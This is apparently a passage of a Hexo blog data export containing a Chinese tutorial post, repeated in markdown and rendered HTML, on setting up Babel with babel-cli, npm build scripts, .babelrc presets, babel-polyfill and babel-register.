文件并启用一些插件。 [详看](https://babeljs.cn/docs/setup/#installation)\n\n首先，你可以使用转换 ES2015+ 的 env preset：\n```bash\nnpm install babel-preset-env --save-dev\n```\n为了让 preset 生效，你需要像下面这样定义你的 .babelrc 文件：\n```json\n{\n  \"presets\": [\"env\"],\n  \"plugins\": []\n}\n```\n> .babelrc配置文件非常丰富：\n\n```bash\n# ES2015转码规则\n$ npm install --save-dev babel-preset-es2015\n\n# react转码规则\n$ npm install --save-dev babel-preset-react\n\n# ES7不同阶段语法提案的转码规则（共有4个阶段），选装一个\n$ npm install --save-dev babel-preset-stage-0\n$ npm install --save-dev babel-preset-stage-1\n$ npm install --save-dev babel-preset-stage-2\n$ npm install --save-dev babel-preset-stage-3\n```\n最后，我们的 .babelrc 文件可以长这个样：\n``` json\n{\n  \"presets\": [\n    \"es2015\",\n    \"react\",\n    \"stage-2\"\n  ],\n  \"plugins\": []\n}\n```\n\n#### <a name=\"polyfill\">4. Babel-Polyfill</a>\n\nBabel默认只转换新的JavaScript句法（syntax），而不转换新的API，比如Iterator、Generator、Set、Maps、Proxy、Reflect、Symbol、Promise等全局对象，以及一些定义在全局对象上的方法（比如`Object.assign`）都不会转码。\n\n举例来说，ES6在Array对象上新增了`Array.from`方法。Babel就不会转码这个方法。如果想让这个方法运行，必须使用babel-polyfill，为当前环境提供一个垫片。\n\n安装命令如下：\n```bash\nnpm install --save babel-polyfill\n```\n然后，在脚本头部，加入如下一行代码：\n```js\nimport 'babel-polyfill';\n// 或者\nrequire('babel-polyfill');\n```\n\n#### <a name=\"register\">5. Babel-Register</a>\n\nbabel-register模块改写require命令，为它加上一个钩子。此后，每当使用require加载.js、.jsx、.es和.es6后缀名的文件，就会先用Babel进行转码。\n```bash\nnpm install --save-dev babel-register\n```\n使用时，必须首先加载babel-register：\n```js\nimport(\"babel-register\");\nimport(\"./index.js\");\n```\n然后，就不需要手动对index.js转码了。\n> 需要注意的是，babel-register只会对require命令加载的文件转码，而不会对当前文件转码。另外，由于它是实时转码，所以只适合在`开发环境`使用。\n\n#### `后记`：虽然实际项目上的配置根据实际情况有所不同，但是基本的东西就是这个样子了，以后有类似需求就可以根据文档来进行了，非常方便。\n---\n> 参考文档： [babeljs.cn](https://babeljs.cn/) / [ruanyifeng.com](http://www.ruanyifeng.com/blog/2016/01/babel.html?20170213113809)","source":"_posts/0809007_记一次在公司中配置Babel的经历.md","raw":"---\nid: 0809007\ntitle: 记一次在公司中配置 Babel 的经历\ndate: 2017-10-05 13:46:10\ntags:\n    - Babel\n    - es6\n    - JavaScript\ncategories:\n---\n\n- <a href=\"#install\">安装</a>\n- <a href=\"#usage\">使用</a>\n- <a href=\"#babelrc\">创建.babelrc文件</a>\n- <a href=\"#polyfill\">Babel-Polyfill</a>\n- <a href=\"#register\">Babel-Register</a>\n\n&emsp;首先，为什么会写这样一篇文章呢？在进入公司几个月后，写业务代码都是使用es5语法，es6，于是想着使用Babel来构建一下。这样既可以愉快的使用ES6了，还能舒心的写代码，何乐而不为。\n\n- Babel的使用是基于Node.js环境的，所以必须先安装Node。\n- 我们将采用通过安装babel-cli的方式来使用babel。\n\n#### <a name=\"install\">1. 安装</a>\n&emsp;虽然你可以在你的机器上全局安装`Babel CLI`, 但根据单个项目进行本地安装会更好一些。这样做有两个主要的原因：\n* 同一机器上的不同的项目可以依赖不同版本的 Babel, 这允许你一次更新一个项目。\n* 这意味着在你的工作环境中没有隐含的依赖项。它将使你的项目更方便移植、更易于安装。\n\n> 首先我们需要生成一个package.json文件，进入到项目目录执行`npm init`命令，随后一顿选择回车。\n\n```bash\nYSY@SY-YU MINGW64 /d/START/webpack\n$ npm init\nThis utility will walk you through creating a package.json file.\nIt only covers the most common items, and tries to guess sensible defaults.\n\nSee `npm help json` for definitive documentation on these fields\nand exactly what they do.\n\nUse `npm install <pkg>` afterwards to install a package and\nsave it as a dependency in the package.json file.\n\nPress ^C at any time to quit.\npackage name: (webpack)\n```\n*最后，目录下会生成一个package.json文件，打开看一下*\n```json\n{\n  \"name\": \"webpack\",\n  \"version\": \"1.0.0\",\n  \"description\": \"\",\n  \"main\": \"index.js\",\n  \"scripts\": {\n    \"test\": \"echo \\\"Error: no test specified\\\" && exit 1\"\n  },\n  \"author\": \"yvshare.cn\",\n  \"license\": \"ISC\"\n}\n```\n*里面都是刚才npm init时自己的配置*\n\n> 我们可以通过以下命令本地安装 Babel CLI:\n\n```bash\n// 全局安装\nnpm install babel-cli -g\n// 安装在当前项目中\nnpm install --save-dev babel-cli\n```\n我们在当前目录安装babel-cli，随后我们的package.json应该长这个样：\n```json\n{\n  \"name\": \"webpack\",\n  \"version\": \"1.0.0\",\n  \"description\": \"\",\n  \"main\": \"index.js\",\n  \"scripts\": {\n    \"test\": \"echo \\\"Error: no test specified\\\" && exit 1\"\n  },\n  \"author\": \"yvshare.cn\",\n  \"license\": \"ISC\",\n  \"devDependencies\": {\n    \"babel-cli\": \"^6.26.0\"\n  }\n}\n```\n\n#### <a name=\"usage\">2. 使用</a>\n- 我们将把我们的指令放在本地版本的 npm 脚本中，而不是直接通过命令行来运行 Babel.\n\n> 简单的在你的 package.json 中添加一个 \"scripts\" 属性并将 babel 命令放在它的 build 属性中：\n\n```json\n  {\n    \"name\": \"webpack\",\n    \"version\": \"1.0.0\",\n    \"scripts\": {\n      \"test\": \"echo \\\"Error: no test specified\\\" && exit 1\",\n+     \"build\": \"babel src -d lib\"  // 加入这一句命令\n    },\n    \"devDependencies\": {\n      \"babel-cli\": \"^6.26.0\"\n    }\n  }\n```\n现在从我们的终端可以运行以下命令：\n```bash\nnpm run build\n```\n*这会按照和之前一样的方式来运行 Babel 并将输出放在 lib 目录下，唯一不同在于我们现在使用了一个本地拷贝。*\n> 值得注意的是在babel的build命令是可以在build属性中自行配置的，上面是把src目录下的脚本打包到lib目录中，你也可以打包单个文件...\n\n#### <a name=\"babelrc\">3. 创建.babelrc配置文件</a>\n\n- 虽然已经配置好了 Babel ，但并没有让它真正生效。在项目的根目录中创建一个 .babelrc 文件并启用一些插件。 [详看](https://babeljs.cn/docs/setup/#installation)\n\n首先，你可以使用转换 ES2015+ 的 env preset：\n```bash\nnpm install babel-preset-env --save-dev\n```\n为了让 preset 生效，你需要像下面这样定义你的 .babelrc 文件：\n```json\n{\n  \"presets\": [\"env\"],\n  \"plugins\": []\n}\n```\n> .babelrc配置文件非常丰富：\n\n```bash\n# ES2015转码规则\n$ npm install --save-dev babel-preset-es2015\n\n# react转码规则\n$ npm install --save-dev babel-preset-react\n\n# ES7不同阶段语法提案的转码规则（共有4个阶段），选装一个\n$ npm install --save-dev babel-preset-stage-0\n$ npm install --save-dev babel-preset-stage-1\n$ npm install --save-dev babel-preset-stage-2\n$ npm install --save-dev babel-preset-stage-3\n```\n最后，我们的 .babelrc 文件可以长这个样：\n``` json\n{\n  \"presets\": [\n    \"es2015\",\n    \"react\",\n    \"stage-2\"\n  ],\n  \"plugins\": []\n}\n```\n\n#### <a name=\"polyfill\">4. Babel-Polyfill</a>\n\nBabel默认只转换新的JavaScript句法（syntax），而不转换新的API，比如Iterator、Generator、Set、Maps、Proxy、Reflect、Symbol、Promise等全局对象，以及一些定义在全局对象上的方法（比如`Object.assign`）都不会转码。\n\n举例来说，ES6在Array对象上新增了`Array.from`方法。Babel就不会转码这个方法。如果想让这个方法运行，必须使用babel-polyfill，为当前环境提供一个垫片。\n\n安装命令如下：\n```bash\nnpm install --save babel-polyfill\n```\n然后，在脚本头部，加入如下一行代码：\n```js\nimport 'babel-polyfill';\n// 或者\nrequire('babel-polyfill');\n```\n\n#### <a name=\"register\">5. Babel-Register</a>\n\nbabel-register模块改写require命令，为它加上一个钩子。此后，每当使用require加载.js、.jsx、.es和.es6后缀名的文件，就会先用Babel进行转码。\n```bash\nnpm install --save-dev babel-register\n```\n使用时，必须首先加载babel-register：\n```js\nimport(\"babel-register\");\nimport(\"./index.js\");\n```\n然后，就不需要手动对index.js转码了。\n> 需要注意的是，babel-register只会对require命令加载的文件转码，而不会对当前文件转码。另外，由于它是实时转码，所以只适合在`开发环境`使用。\n\n#### `后记`：虽然实际项目上的配置根据实际情况有所不同，但是基本的东西就是这个样子了，以后有类似需求就可以根据文档来进行了，非常方便。\n---\n> 参考文档： [babeljs.cn](https://babeljs.cn/) / [ruanyifeng.com](http://www.ruanyifeng.com/blog/2016/01/babel.html?20170213113809)","slug":"0809007_记一次在公司中配置Babel的经历","published":1,"updated":"2018-03-26T12:14:05.915Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjfhshvt80005s4c0vq7mbubp","content":"<ul>\n<li><a href=\"#install\">安装</a></li>\n<li><a href=\"#usage\">使用</a></li>\n<li><a href=\"#babelrc\">创建.babelrc文件</a></li>\n<li><a href=\"#polyfill\">Babel-Polyfill</a></li>\n<li><a href=\"#register\">Babel-Register</a></li>\n</ul>\n<p>&emsp;首先，为什么会写这样一篇文章呢？在进入公司几个月后，写业务代码都是使用es5语法，es6，于是想着使用Babel来构建一下。这样既可以愉快的使用ES6了，还能舒心的写代码，何乐而不为。</p>\n<ul>\n<li>Babel的使用是基于Node.js环境的，所以必须先安装Node。</li>\n<li>我们将采用通过安装babel-cli的方式来使用babel。</li>\n</ul>\n<h4 id=\"1-安装\"><a href=\"#1-安装\" class=\"headerlink\" title=\"1. 安装\"></a><a name=\"install\">1. 安装</a></h4><p>&emsp;虽然你可以在你的机器上全局安装<code>Babel CLI</code>, 但根据单个项目进行本地安装会更好一些。这样做有两个主要的原因：</p>\n<ul>\n<li>同一机器上的不同的项目可以依赖不同版本的 Babel, 这允许你一次更新一个项目。</li>\n<li>这意味着在你的工作环境中没有隐含的依赖项。它将使你的项目更方便移植、更易于安装。</li>\n</ul>\n<blockquote>\n<p>首先我们需要生成一个package.json文件，进入到项目目录执行<code>npm init</code>命令，随后一顿选择回车。</p>\n</blockquote>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">YSY@SY-YU MINGW64 /d/START/webpack</span><br><span class=\"line\">$ npm init</span><br><span class=\"line\">This utility will walk you through creating a package.json file.</span><br><span class=\"line\">It only covers the most common items, and tries to guess sensible defaults.</span><br><span class=\"line\"></span><br><span class=\"line\">See `npm <span class=\"built_in\">help</span> json` <span class=\"keyword\">for</span> definitive documentation on these fields</span><br><span class=\"line\">and exactly what they <span class=\"keyword\">do</span>.</span><br><span class=\"line\"></span><br><span class=\"line\">Use `npm install &lt;pkg&gt;` afterwards to install a package and</span><br><span class=\"line\">save it as a dependency <span class=\"keyword\">in</span> the package.json file.</span><br><span class=\"line\"></span><br><span class=\"line\">Press ^C at any time to quit.</span><br><span class=\"line\">package name: (webpack)</span><br></pre></td></tr></table></figure>\n<p><em>最后，目录下会生成一个package.json文件，打开看一下</em><br><figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"webpack\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"version\"</span>: <span class=\"string\">\"1.0.0\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"description\"</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"main\"</span>: <span class=\"string\">\"index.js\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"scripts\"</span>: &#123;</span><br><span class=\"line\">    <span class=\"attr\">\"test\"</span>: <span class=\"string\">\"echo \\\"Error: no test specified\\\" &amp;&amp; exit 1\"</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  <span class=\"attr\">\"author\"</span>: <span class=\"string\">\"yvshare.cn\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"license\"</span>: <span class=\"string\">\"ISC\"</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><em>里面都是刚才npm init时自己的配置</em></p>\n<blockquote>\n<p>我们可以通过以下命令本地安装 Babel CLI:</p>\n</blockquote>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 全局安装</span><br><span class=\"line\">npm install babel-cli -g</span><br><span class=\"line\">// 安装在当前项目中</span><br><span class=\"line\">npm install --save-dev babel-cli</span><br></pre></td></tr></table></figure>\n<p>我们在当前目录安装babel-cli，随后我们的package.json应该长这个样：<br><figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"webpack\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"version\"</span>: <span class=\"string\">\"1.0.0\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"description\"</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"main\"</span>: <span class=\"string\">\"index.js\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"scripts\"</span>: &#123;</span><br><span class=\"line\">    <span class=\"attr\">\"test\"</span>: <span class=\"string\">\"echo \\\"Error: no test specified\\\" &amp;&amp; exit 1\"</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  <span class=\"attr\">\"author\"</span>: <span class=\"string\">\"yvshare.cn\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"license\"</span>: <span class=\"string\">\"ISC\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"devDependencies\"</span>: &#123;</span><br><span class=\"line\">    <span class=\"attr\">\"babel-cli\"</span>: <span class=\"string\">\"^6.26.0\"</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"2-使用\"><a href=\"#2-使用\" class=\"headerlink\" title=\"2. 使用\"></a><a name=\"usage\">2. 使用</a></h4><ul>\n<li>我们将把我们的指令放在本地版本的 npm 脚本中，而不是直接通过命令行来运行 Babel.</li>\n</ul>\n<blockquote>\n<p>简单的在你的 package.json 中添加一个 “scripts” 属性并将 babel 命令放在它的 build 属性中：</p>\n</blockquote>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"webpack\"</span>,</span><br><span class=\"line\">    <span class=\"attr\">\"version\"</span>: <span class=\"string\">\"1.0.0\"</span>,</span><br><span class=\"line\">    <span class=\"attr\">\"scripts\"</span>: &#123;</span><br><span class=\"line\">      <span class=\"attr\">\"test\"</span>: <span class=\"string\">\"echo \\\"Error: no test specified\\\" &amp;&amp; exit 1\"</span>,</span><br><span class=\"line\">+     \"build\": \"babel src -d lib\"  // 加入这一句命令</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    \"devDependencies\": &#123;</span><br><span class=\"line\">      \"babel-cli\": \"^6.26.0\"</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure>\n<p>现在从我们的终端可以运行以下命令：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm run build</span><br></pre></td></tr></table></figure></p>\n<p><em>这会按照和之前一样的方式来运行 Babel 并将输出放在 lib 目录下，唯一不同在于我们现在使用了一个本地拷贝。</em></p>\n<blockquote>\n<p>值得注意的是在babel的build命令是可以在build属性中自行配置的，上面是把src目录下的脚本打包到lib目录中，你也可以打包单个文件…</p>\n</blockquote>\n<h4 id=\"3-创建-babelrc配置文件\"><a href=\"#3-创建-babelrc配置文件\" class=\"headerlink\" title=\"3. 创建.babelrc配置文件\"></a><a name=\"babelrc\">3. 创建.babelrc配置文件</a></h4><ul>\n<li>虽然已经配置好了 Babel ，但并没有让它真正生效。在项目的根目录中创建一个 .babelrc 文件并启用一些插件。 <a href=\"https://babeljs.cn/docs/setup/#installation\" target=\"_blank\" rel=\"noopener\">详看</a></li>\n</ul>\n<p>首先，你可以使用转换 ES2015+ 的 env preset：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install babel-preset-env --save-dev</span><br></pre></td></tr></table></figure></p>\n<p>为了让 preset 生效，你需要像下面这样定义你的 .babelrc 文件：<br><figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"attr\">\"presets\"</span>: [<span class=\"string\">\"env\"</span>],</span><br><span class=\"line\">  <span class=\"attr\">\"plugins\"</span>: []</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<p>.babelrc配置文件非常丰富：</p>\n</blockquote>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># ES2015转码规则</span></span><br><span class=\"line\">$ npm install --save-dev babel-preset-es2015</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># react转码规则</span></span><br><span class=\"line\">$ npm install --save-dev babel-preset-react</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ES7不同阶段语法提案的转码规则（共有4个阶段），选装一个</span></span><br><span class=\"line\">$ npm install --save-dev babel-preset-stage-0</span><br><span class=\"line\">$ npm install --save-dev babel-preset-stage-1</span><br><span class=\"line\">$ npm install --save-dev babel-preset-stage-2</span><br><span class=\"line\">$ npm install --save-dev babel-preset-stage-3</span><br></pre></td></tr></table></figure>\n<p>最后，我们的 .babelrc 文件可以长这个样：<br><figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"attr\">\"presets\"</span>: [</span><br><span class=\"line\">    <span class=\"string\">\"es2015\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"react\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"stage-2\"</span></span><br><span class=\"line\">  ],</span><br><span class=\"line\">  <span class=\"attr\">\"plugins\"</span>: []</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"4-Babel-Polyfill\"><a href=\"#4-Babel-Polyfill\" class=\"headerlink\" title=\"4. Babel-Polyfill\"></a><a name=\"polyfill\">4. Babel-Polyfill</a></h4><p>Babel默认只转换新的JavaScript句法（syntax），而不转换新的API，比如Iterator、Generator、Set、Maps、Proxy、Reflect、Symbol、Promise等全局对象，以及一些定义在全局对象上的方法（比如<code>Object.assign</code>）都不会转码。</p>\n<p>举例来说，ES6在Array对象上新增了<code>Array.from</code>方法。Babel就不会转码这个方法。如果想让这个方法运行，必须使用babel-polyfill，为当前环境提供一个垫片。</p>\n<p>安装命令如下：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install --save babel-polyfill</span><br></pre></td></tr></table></figure></p>\n<p>然后，在脚本头部，加入如下一行代码：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> <span class=\"string\">'babel-polyfill'</span>;</span><br><span class=\"line\"><span class=\"comment\">// 或者</span></span><br><span class=\"line\"><span class=\"built_in\">require</span>(<span class=\"string\">'babel-polyfill'</span>);</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"5-Babel-Register\"><a href=\"#5-Babel-Register\" class=\"headerlink\" title=\"5. Babel-Register\"></a><a name=\"register\">5. Babel-Register</a></h4><p>babel-register模块改写require命令，为它加上一个钩子。此后，每当使用require加载.js、.jsx、.es和.es6后缀名的文件，就会先用Babel进行转码。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install --save-dev babel-register</span><br></pre></td></tr></table></figure></p>\n<p>使用时，必须首先加载babel-register：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span>(<span class=\"string\">\"babel-register\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">import</span>(<span class=\"string\">\"./index.js\"</span>);</span><br></pre></td></tr></table></figure></p>\n<p>然后，就不需要手动对index.js转码了。</p>\n<blockquote>\n<p>需要注意的是，babel-register只会对require命令加载的文件转码，而不会对当前文件转码。另外，由于它是实时转码，所以只适合在<code>开发环境</code>使用。</p>\n</blockquote>\n<h4 id=\"后记：虽然实际项目上的配置根据实际情况有所不同，但是基本的东西就是这个样子了，以后有类似需求就可以根据文档来进行了，非常方便。\"><a href=\"#后记：虽然实际项目上的配置根据实际情况有所不同，但是基本的东西就是这个样子了，以后有类似需求就可以根据文档来进行了，非常方便。\" class=\"headerlink\" title=\"后记：虽然实际项目上的配置根据实际情况有所不同，但是基本的东西就是这个样子了，以后有类似需求就可以根据文档来进行了，非常方便。\"></a><code>后记</code>：虽然实际项目上的配置根据实际情况有所不同，但是基本的东西就是这个样子了，以后有类似需求就可以根据文档来进行了，非常方便。</h4><hr>\n<blockquote>\n<p>参考文档： <a href=\"https://babeljs.cn/\" target=\"_blank\" rel=\"noopener\">babeljs.cn</a> / <a href=\"http://www.ruanyifeng.com/blog/2016/01/babel.html?20170213113809\" target=\"_blank\" rel=\"noopener\">ruanyifeng.com</a></p>\n</blockquote>\n","site":{"data":{}},"excerpt":"","more":"<ul>\n<li><a href=\"#install\">安装</a></li>\n<li><a href=\"#usage\">使用</a></li>\n<li><a href=\"#babelrc\">创建.babelrc文件</a></li>\n<li><a href=\"#polyfill\">Babel-Polyfill</a></li>\n<li><a href=\"#register\">Babel-Register</a></li>\n</ul>\n<p>&emsp;首先，为什么会写这样一篇文章呢？在进入公司几个月后，写业务代码都是使用es5语法，es6，于是想着使用Babel来构建一下。这样既可以愉快的使用ES6了，还能舒心的写代码，何乐而不为。</p>\n<ul>\n<li>Babel的使用是基于Node.js环境的，所以必须先安装Node。</li>\n<li>我们将采用通过安装babel-cli的方式来使用babel。</li>\n</ul>\n<h4 id=\"1-安装\"><a href=\"#1-安装\" class=\"headerlink\" title=\"1. 安装\"></a><a name=\"install\">1. 安装</a></h4><p>&emsp;虽然你可以在你的机器上全局安装<code>Babel CLI</code>, 但根据单个项目进行本地安装会更好一些。这样做有两个主要的原因：</p>\n<ul>\n<li>同一机器上的不同的项目可以依赖不同版本的 Babel, 这允许你一次更新一个项目。</li>\n<li>这意味着在你的工作环境中没有隐含的依赖项。它将使你的项目更方便移植、更易于安装。</li>\n</ul>\n<blockquote>\n<p>首先我们需要生成一个package.json文件，进入到项目目录执行<code>npm init</code>命令，随后一顿选择回车。</p>\n</blockquote>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">YSY@SY-YU MINGW64 /d/START/webpack</span><br><span class=\"line\">$ npm init</span><br><span class=\"line\">This utility will walk you through creating a package.json file.</span><br><span class=\"line\">It only covers the most common items, and tries to guess sensible defaults.</span><br><span class=\"line\"></span><br><span class=\"line\">See `npm <span class=\"built_in\">help</span> json` <span class=\"keyword\">for</span> definitive documentation on these fields</span><br><span class=\"line\">and exactly what they <span class=\"keyword\">do</span>.</span><br><span class=\"line\"></span><br><span class=\"line\">Use `npm install &lt;pkg&gt;` afterwards to install a package and</span><br><span class=\"line\">save it as a dependency <span class=\"keyword\">in</span> the package.json file.</span><br><span class=\"line\"></span><br><span class=\"line\">Press ^C at any time to quit.</span><br><span class=\"line\">package name: (webpack)</span><br></pre></td></tr></table></figure>\n<p><em>最后，目录下会生成一个package.json文件，打开看一下</em><br><figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"webpack\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"version\"</span>: <span class=\"string\">\"1.0.0\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"description\"</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"main\"</span>: <span class=\"string\">\"index.js\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"scripts\"</span>: &#123;</span><br><span class=\"line\">    <span class=\"attr\">\"test\"</span>: <span class=\"string\">\"echo \\\"Error: no test specified\\\" &amp;&amp; exit 1\"</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  <span class=\"attr\">\"author\"</span>: <span class=\"string\">\"yvshare.cn\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"license\"</span>: <span class=\"string\">\"ISC\"</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><em>里面都是刚才npm init时自己的配置</em></p>\n<blockquote>\n<p>我们可以通过以下命令本地安装 Babel CLI:</p>\n</blockquote>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 全局安装</span><br><span class=\"line\">npm install babel-cli -g</span><br><span class=\"line\">// 安装在当前项目中</span><br><span class=\"line\">npm install --save-dev babel-cli</span><br></pre></td></tr></table></figure>\n<p>我们在当前目录安装babel-cli，随后我们的package.json应该长这个样：<br><figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"webpack\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"version\"</span>: <span class=\"string\">\"1.0.0\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"description\"</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"main\"</span>: <span class=\"string\">\"index.js\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"scripts\"</span>: &#123;</span><br><span class=\"line\">    <span class=\"attr\">\"test\"</span>: <span class=\"string\">\"echo \\\"Error: no test specified\\\" &amp;&amp; exit 